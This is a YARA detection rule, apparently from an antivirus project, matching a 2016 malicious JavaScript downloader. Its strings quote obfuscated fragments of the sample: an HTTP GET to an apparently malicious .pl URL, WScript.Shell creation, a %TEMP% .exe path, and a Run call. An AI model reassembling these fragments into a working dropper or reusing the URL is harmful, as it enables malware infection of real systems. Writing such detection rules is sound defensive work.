rule sig_20160401_b134834b09f327fc7103efad29f01624 {
  meta:
    description = "datamaliciousorder - file 20160401_b134834b09f327fc7103efad29f01624.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "94fdaf06466daf25f3008dd778eb45ec5d3199ce72282685b389a6e3ace67c16"

  strings:
    $s1  = "WbTs[SjrHuq](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "function ZmDu(TnMsr, ApvJa){PlNdc = PlNdc * 1; return TnMsr - ApvJa;};" fullword ascii
    $s3  = "var TvjTn = function IzwSry() {return WScript[YxdJj](\"WScript\"+\".Shell\");}(), RnDhu = 11;" fullword ascii
    $s4  = "if (WbTs[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SfBr(){return XdKe + \"\";};" fullword ascii
    $s6  = "function YlYwb() {return TvjTn[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DF0HgRify.ex\" + \"e\";};" fullword ascii
    $s7  = "function QbvLp() {return ((JhpLpf == true) && (JhpLpf == JoHnm)) ? 1 : PlNdc;};" fullword ascii
    $s8  = "var XeCb = new this[\"Date\"]();" fullword ascii
    $s9  = "JhpLpf = true; " fullword ascii
    $s10 = "function GsNq(){return 23;};" fullword ascii
    $s11 = "var VrmKdc = false;" fullword ascii
    $s12 = "}while (WdgXeb);" fullword ascii
    $s13 = "function YioJkt()" fullword ascii
    $s14 = "var JoHnm = false;" fullword ascii
    $s15 = "return ZmDu(ZtTbj, ZeqCy);" fullword ascii
    $s16 = "function NtKxt(WyUrn) {var ZtFny = (1, 2, 3, 4, 5, WyUrn); return ZtFny;};" fullword ascii
    $s17 = "JoHnm = true; " fullword ascii
    $s18 = "function JfUoy(SvzVcw){TvjTn[\"R\"+\"un\"](SvzVcw, PlNdc, PlNdc);};" fullword ascii
    $s19 = "function NwfFz(){return YxdJj;};" fullword ascii
    $s20 = "var JhpLpf = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}